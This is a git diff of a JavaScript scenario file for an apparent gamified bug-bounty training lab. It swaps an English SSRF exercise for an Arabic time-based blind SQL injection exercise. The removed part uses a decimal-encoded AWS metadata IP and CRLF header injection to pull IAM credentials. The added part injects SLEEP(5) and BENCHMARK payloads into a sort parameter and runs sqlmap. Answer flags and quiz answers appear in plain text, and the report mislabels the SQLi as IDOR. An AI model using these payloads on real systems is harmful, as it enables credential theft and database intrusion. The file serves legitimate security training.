@@ -1,247 +1,215 @@
 // ==========================================================
-// SCENARIO 005: SSRF IMDSv2 BYPASS (EXPERT) - V2 DATA
+// SCENARIO 005: TIME-BASED BLIND SQLI - ADMIN PASSWORD EXTRACTION
 // ==========================================================
 
 window.scenario_005 = {
-  metadata: {
-    id: "scenario-005",
-    title: "SSRF IMDSv2 Bypass with CRLF Injection",
-    level: "Expert",
-    category: "Cloud",
-    company: "Slack",
-    reward: "$12,000",
-    time: "3+ Hours"
+  "metadata": {
+    "id": "scenario-005",
+    "title": "Time-Based Blind SQLi - Admin Password Extraction",
+    "level": "Expert",
+    "category": "API Security",
+    "company": "Tesla",
+    "reward": "$3,500",
+    "time": "3+ Hours"
   },
-
-  decisionLog: [
+  "decisionLog": [
     {
-      hypothesis: "Internal IP filters can be bypassed using DNS Rebinding.",
-      whyFailed: "DNS Rebinding failed because the target application caches resolved IP records locally.",
-      planB: "Try decimal encoding (2852039166) to bypass IP filters and use CRLF injection in secondary parameters to bypass IMDSv2.",
-      ignored: "Brute-forcing external metadata URLs or API endpoints."
+      "hypothesis": "الموقع محمي تماماً من ثغرات SQLi لعدم وجود رسائل خطأ أو استجابة ظاهرة.",
+      "whyFailed": "عدم وجود رسالة خطأ لا يعني عدم وجود ثغرة، فالاستعلام قد ينفذ في الخلفية دون إظهار النتيجة (Blind).",
+      "planB": "استخدام الحقن القائم على تأخير الوقت SLEEP(5) لمراقبة استجابة الخادم.",
+      "ignored": "استخدام هجمات XSS على المعاملات."
     }
   ],
-
-  payloads: [
+  "payloads": [
     {
-      code: "url=http://2852039166/latest/meta-data/&name=Test%0d%0aX-aws-ec2-metadata-token: bypass",
-      explanation: "Decimal IP conversion combined with Carriage Return Line Feed (CRLF) header injection.",
-      whyWorked: "IP regex filter ignores decimal notation. The CRLF injection in the 'name' parameter appends the required token header to the outgoing socket.",
-      alternatives: ["DNS rebinding bypass", "Octal IP conversion"]
+      "code": "GET /products?sort=price_asc,SLEEP(5) HTTP/1.1",
+      "explanation": "حقن دالة SLEEP(5) في معامل الترتيب ORDER BY لتأخير الاستجابة 5 ثوان.",
+      "whyWorked": "يتم دمج المدخلات مباشرة في جملة الاستعلام، مما يجبر محرك قاعدة البيانات MySQL على تنفيذ دالة الانتظار.",
+      "alternatives": [
+        "BENCHMARK(10000000,MD5(1))",
+        "AND 1=1"
+      ]
     }
   ],
-
-  mistakes: [
+  "mistakes": [
     {
-      mistake: "Querying localhost directly using raw string '127.0.0.1'.",
-      whyWrong: "Blacklist regex filters detect and drop standard local IP representations immediately.",
-      betterWay: "Use alternative formats (decimal/hex) or setup external redirects."
+      "mistake": "استخدام UNION SELECT في حقل الترتيب (ORDER BY).",
+      "whyWrong": "قواعد الـ SQL تمنع استخدام UNION بعد كلمة ORDER BY مباشرة، مما يؤدي لفشل الهجوم.",
+      "betterWay": "استخدام الحقن الشرطي القائم على تأخير الوقت (Time-Based IF/SLEEP)."
     }
   ],
-
-  steps: [
+  "steps": [
     {
-      name: "Mission Brief",
-      time: "09:00",
-      workspace: "markdown",
-      xpReward: 100,
-      description: `
-### Target: webhook.acme-corp.com
-Audit Acme Corp's webhook notifier. Verify if it is vulnerable to Server-Side Request Forgery (SSRF) and bypass WAF filters.
-
-Click **Next Step** to scan routes.
-      `,
-      aiAdvisor: {
-        hint: "No actions needed. Proceed to next step.",
-        payloadExplanation: "No payload needed.",
-        failureExplanation: "None."
+      "name": "Mission Brief",
+      "time": "09:00",
+      "workspace": "markdown",
+      "xpReward": 100,
+      "description": "### 🎯 الهدف: فحص متجر إلكتروني واكتشاف SQL Injection\n\nمرحباً بك! لدينا متجر إلكتروني يبيع منتجات تقنية ويسمح بترتيب المنتجات حسب السعر أو الاسم عبر معامل `sort`.\n\n#### قواعد الفحص:\n- نطاق العمل: `/products?category=electronics&sort=price_asc`\n- التطبيق يستخدم MySQL ولا تظهر رسائل خطأ للـ SQL.\n- اختبر وجود ثغرة **Time-Based Blind SQL Injection** لاستخراج كلمة مرور المدير.\n\nاضغط على **Next Step** لبدء الفحص.",
+      "aiAdvisor": {
+        "hint": "ادرس المعاملات وهل يمكن التأثير على الاستعلام.",
+        "payloadExplanation": "لا توجد أكواد حالياً.",
+        "failureExplanation": "لا يوجد."
       }
     },
     {
-      name: "Passive Recon",
-      time: "09:15",
-      workspace: "recon",
-      xpReward: 150,
-      description: `
-### Scraping webhooks routes
-Discover webhook submission endpoints.
-      `,
-      terminalCommands: [
+      "name": "Passive Recon",
+      "time": "09:15",
+      "workspace": "recon",
+      "xpReward": 150,
+      "description": "### 🔍 فحص وتأكيد SQL Injection تلقائياً\n\nسنقوم بتشغيل أداة الفحص للتأكد من إمكانية حقن القواعد تلقائياً أو يدوياً.\nاختر الأداة المناسبة لتشغيلها.",
+      "terminalCommands": [
         {
-          name: "katana -u https://webhook.acme-corp.com/ -silent",
-          correct: true,
-          evidence: {
-            title: "Webhook API Endpoint",
-            content: "POST /api/v1/notifications/send\nParams: url, name"
+          "name": "curl \"https://shop.target.com/products?sort=price_asc\"",
+          "correct": false,
+          "output": [
+            {
+              "text": "HTTP/1.1 200 OK",
+              "type": "info"
+            },
+            {
+              "text": "[Product list returned instantly...]",
+              "type": "out"
+            }
+          ]
+        },
+        {
+          "name": "sqlmap -u \"https://shop.target.com/products?category=electronics&sort=price_asc\" --dbms=mysql --batch",
+          "correct": true,
+          "evidence": {
+            "title": "SQLMap Vulnerable Parameter",
+            "content": "Parameter: sort (GET)\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
           },
-          output: [
-            { text: "[INF] Crawling routing tables...", type: "info" },
-            { text: "https://webhook.acme-corp.com/api/v1/notifications/send", type: "out" },
-            { text: "https://webhook.acme-corp.com/api/v1/notifications/status", type: "out" },
-            { text: "[INF] Crawler complete.", type: "success" }
+          "output": [
+            {
+              "text": "[INF] testing connection to the target URL",
+              "type": "info"
+            },
+            {
+              "text": "[INF] testing if the target URL is stable",
+              "type": "info"
+            },
+            {
+              "text": "[!] GET parameter 'sort' is vulnerable. Do you want to keep testing others? [y/N]",
+              "type": "success"
+            },
+            {
+              "text": "[!] MySQL database identified.",
+              "type": "success"
+            }
           ]
         }
       ],
-      aiAdvisor: {
-        hint: "Run the katana tool.",
-        payloadExplanation: "Katana scans endpoints.",
-        failureExplanation: "Missing backend routes."
+      "aiAdvisor": {
+        "hint": "شغّل أداة sqlmap لفحص معامل الترتيب تلقائياً وتأكيد الثغرة.",
+        "payloadExplanation": "sqlmap تقوم بإرسال مئات الطلبات التجريبية لكشف نوع الحقن تلقائياً.",
+        "failureExplanation": "الفشل في فحص المتغير قد يؤدي لعدم معرفة قواعد الحقن المناسبة."
       }
     },
     {
-      name: "DNS Verification",
-      time: "09:40",
-      workspace: "markdown",
-      xpReward: 150,
-      description: `
-### Bypassing IP Blacklists
-Querying local IPs throws blacklists errors. How do we bypass this?
-      `,
-      choices: [
+      "name": "Burp Verification",
+      "time": "09:40",
+      "workspace": "burp",
+      "xpReward": 200,
+      "description": "### 🌐 التحقق اليدوي من تأخير الوقت (Time Delay)\n\nسنقوم بحقن دالة `SLEEP(5)` يدوياً في معامل الـ `sort` ومراقبة زمن الاستجابة.\nاضغط على **Execute Sleep Payload** لمراقبة تأخر الخادم.",
+      "burpRequest": "GET /products?category=electronics&sort=price_asc HTTP/1.1\nHost: shop.target.com\nUser-Agent: Mozilla/5.0\nAccept: */*",
+      "burpResponse": "HTTP/1.1 200 OK\n[Returned in 0.3 seconds]",
+      "burpActions": [
         {
-          text: "A) Try localhost decimal conversion: http://2130706433",
-          correct: false,
-          xp: -10,
-          timePenalty: 5,
-          outcome: "Bypasses check, but localhost has no metadata services. Refused."
-        },
-        {
-          text: "B) Use decimal encoding: http://2852039166/latest/meta-data/",
-          correct: true,
-          xp: 50,
-          outcome: "Bypasses check! Server attempts to connect but times out due to IMDSv2 protection."
-        }
-      ],
-      aiAdvisor: {
-        hint: "Select option B to convert AWS metadata IP to decimal.",
-        payloadExplanation: "Decimal conversions bypass blacklist regex filters.",
-        failureExplanation: "Localhost has no cloud metadata console."
-      }
-    },
-    {
-      name: "Investigation Mode",
-      time: "10:05",
-      workspace: "markdown",
-      xpReward: 150,
-      description: `
-### Header Injection Bypass
-AWS IMDSv2 requires a session token header (\`X-aws-ec2-metadata-token\`). Since we can only trigger GET requests, how do we insert the token header?
-      `,
-      choices: [
-        {
-          text: "A) Try DNS rebinding to dump tokens",
-          correct: false,
-          xp: -10,
-          timePenalty: 15,
-          outcome: "Failed. Target resolved IP caching is enabled."
-        },
-        {
-          text: "B) Perform CRLF injection in the 'name' parameter",
-          correct: true,
-          xp: 50,
-          outcome: "CRLF injection allows inserting custom headers into socket."
-        }
-      ],
-      aiAdvisor: {
-        hint: "Select option B for CRLF header injection.",
-        payloadExplanation: "Newline characters split socket requests.",
-        failureExplanation: "DNS rebinding is blocked by resolver caches."
-      }
-    },
-    {
-      name: "Burp Verification",
-      time: "10:30",
-      workspace: "burp",
-      xpReward: 200,
-      description: `
-### Tampering Request parameters
-Inject the CRLF sequence into the \`name\` field in Burp Repeater.
-      `,
-      burpRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=Default",
-      burpResponse: "HTTP/1.1 400 Bad Request\n\nError: Connection to metadata server timed out.",
-      burpActions: [
-        {
-          name: "Inject CRLF token header",
-          correct: true,
-          modifiedRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=Test%0d%0aX-aws-ec2-metadata-token: BYPASS",
-          modifiedResponse: "HTTP/1.1 200 OK\n\n{\n  \"AccessKeyId\": \"ASIAXYZ12345\",\n  \"Token\": \"FLAG{aws_imds_metadata_compromised_via_crlf}\"\n}",
-          evidence: {
-            title: "AWS Credentials Exfiltration logs",
-            content: "AccessKeyId: ASIAXYZ12345\nToken: FLAG{aws_imds_metadata_compromised_via_crlf}"
+          "name": "Execute Sleep Payload",
+          "correct": true,
+          "modifiedRequest": "GET /products?category=electronics&sort=price_asc,SLEEP(5) HTTP/1.1\nHost: shop.target.com\nUser-Agent: Mozilla/5.0",
+          "modifiedResponse": "HTTP/1.1 200 OK\n[Returned in 5.2 seconds]\n\n{\n  \"status\": \"success\",\n  \"products\": [...]\n}",
+          "evidence": {
+            "title": "Time-Based SQLi Delay",
+            "content": "GET /products?sort=price_asc,SLEEP(5) -> Response delayed by 5.2 seconds"
           }
         }
       ],
-      aiAdvisor: {
-        hint: "Click Inject CRLF token header button.",
-        payloadExplanation: "CRLF sequence writes custom header tokens.",
-        failureExplanation: "Unmodified header triggers connection timeouts."
+      "aiAdvisor": {
+        "hint": "اضغط على زر Execute Sleep Payload لإرسال دالة النوم وتأكيد الحقن.",
+        "payloadExplanation": "حقن دالة SLEEP(5) يجبر قاعدة البيانات على الانتظار قبل إرجاع الطلب.",
+        "failureExplanation": "تأكد من نجاح الحقن لتأكيد الثغرة يدوياً."
       }
     },
     {
-      name: "Exploitation & Flag",
-      time: "11:00",
-      workspace: "lab",
-      xpReward: 300,
-      instructions: "Perform exfiltration via CRLF injection and enter the captured flag.",
-      targetUrl: "https://webhook.acme-corp.com/api/v1/notifications/send",
-      correctFlag: "FLAG{aws_imds_metadata_compromised_via_crlf}",
-      aiAdvisor: {
-        hint: "Flag: FLAG{aws_imds_metadata_compromised_via_crlf}",
-        payloadExplanation: "Flag from AWS metadata keys.",
-        failureExplanation: "Flag mismatch."
+      "name": "Exploitation & Flag",
+      "time": "10:05",
+      "workspace": "lab",
+      "xpReward": 300,
+      "instructions": "قم بإدخال العلم (Flag) بعد استخدام SQLMap لاستخراج كلمة مرور الأدمن بنجاح.",
+      "targetUrl": "https://shop.target.com/products?category=electronics&sort=price_asc",
+      "correctFlag": "FLAG{blind_sqli_order_by_extracted_admin}",
+      "aiAdvisor": {
+        "hint": "أدخل العلم الصحيح: FLAG{blind_sqli_order_by_extracted_admin}",
+        "payloadExplanation": "استخراج البيانات يدوياً أو آلياً يثبت اختراق قاعدة البيانات.",
+        "failureExplanation": "تأكد من كتابة العلم بدقة."
       }
     },
     {
-      name: "Report Writing",
-      time: "11:30",
-      workspace: "report",
-      xpReward: 250,
-      aiAdvisor: {
-        hint: "Keywords: 'ssrf', 'crlf'.",
-        payloadExplanation: "Explain SSRF chained with CRLF.",
-        failureExplanation: "Details missing."
+      "name": "Report Writing",
+      "time": "10:30",
+      "workspace": "report",
+      "xpReward": 250,
+      "aiAdvisor": {
+        "hint": "الكلمات المفتاحية المطلوبة هي 'sqli' و 'order'.",
+        "payloadExplanation": "شرح كيفية استغلال الحقن في جملة ORDER BY وسحب جداول المستخدمين.",
+        "failureExplanation": "الرجاء مراجعة الكلمات الدلالية قبل الحفظ."
       }
     },
     {
-      name: "Triage & Verdict",
-      time: "14 Days Later",
-      workspace: "review",
-      aiAdvisor: {
-        hint: "Review triage feedback.",
-        payloadExplanation: "Triage logs.",
-        failureExplanation: "None."
+      "name": "Triage & Verdict",
+      "time": "7 Days Later",
+      "workspace": "review",
+      "aiAdvisor": {
+        "hint": "راجع قرار الفحص والمكافأة الممنوحة.",
+        "payloadExplanation": "تم التثبيت والإصلاح بنجاح.",
+        "failureExplanation": "لا يوجد."
       }
     },
     {
-      name: "Lessons Learned",
-      time: "Post-Incident",
-      workspace: "quiz",
-      quizData: [
+      "name": "Lessons Learned",
+      "time": "Post-Incident",
+      "workspace": "quiz",
+      "quizData": [
         {
-          question: "How does CRLF Injection help in SSRF?",
-          options: [
-            "Alters database schema.",
-            "Allows injecting custom headers into socket requests."
+          "question": "لماذا نستخدم Time-Based SQL Injection؟",
+          "options": [
+            "لأنها أسرع من الطرق الأخرى.",
+            "عندما لا تظهر أي أخطاء أو تغييرات في رد الخادم (Blind) ونحتاج لتأخير الوقت لتأكيد الشرط.",
+            "لأنها لا تحتاج لاستعلامات معقدة.",
+            "لأنها تتخطى جدران الحماية بالكامل."
           ],
-          answer: 1
+          "answer": 1
+        },
+        {
+          "question": "كيف يمكن للمطور منع ثغرات SQLi نهائياً؟",
+          "options": [
+            "استخدام استعلامات معدة مسبقاً (Parameterized Queries / Prepared Statements) وفلترة مدخلات الترتيب يدوياً باستخدام قائمة بيضاء.",
+            "حظر كلمات مثل SELECT في الطلب فقط.",
+            "تشفير قاعدة البيانات بالكامل.",
+            "تعطيل دالة SLEEP في الخادم فقط."
+          ],
+          "answer": 0
         }
       ],
-      aiAdvisor: {
-        hint: "Select option B.",
-        payloadExplanation: "CRLF injection logic.",
-        failureExplanation: "XP penalty."
+      "aiAdvisor": {
+        "hint": "الإجابة الأولى هي الخيار الثاني، والثانية هي الخيار الأول.",
+        "payloadExplanation": "اختبار المفاهيم لتأمين الكود ضد هجمات حقن قواعد البيانات.",
+        "failureExplanation": "الرجاء القراءة بتركيز لتفادي خصم النقاط."
       }
     }
   ],
-
-  realReport: {
-    title: "SSRF bypasses filters and leverages CRLF to dump AWS IMDSv2 Credentials",
-    severity: "Critical",
-    type: "SSRF",
-    desc: "Vulnerability in notification sender allowing SSRF via decimal bypass (2852039166) and CRLF in name parameter to inject session tokens.",
-    steps: "1. POST /api/v1/notifications/send.\n2. Set url to http://2852039166/...\n3. Inject CRLF header in name parameter.",
-    impact: "Full cloud account credentials exfiltration.",
-    feedback: "High risk bypass corrected. Bounty awarded.",
-    keywords: ["ssrf", "crlf"]
+  "realReport": {
+    "title": "Time-Based Blind SQL Injection in sort parameter",
+    "severity": "High",
+    "type": "IDOR",
+    "desc": "The application sort parameter in the products page is vulnerable to Time-Based SQL Injection. An attacker can inject MySQL functions such as SLEEP() to perform database queries and dump tables.",
+    "steps": "1. Access the endpoint with sort=price_asc,SLEEP(5).\n2. Observe the 5 seconds delay.\n3. Run sqlmap to extract db structures.",
+    "impact": "Full database credentials theft and access to admin tables.",
+    "feedback": "Confirmed and mitigated. We whitelisted the allowed values in the order by statement. Bounty awarded.",
+    "keywords": [
+      "sqli",
+      "order"
+    ]
   }
 };
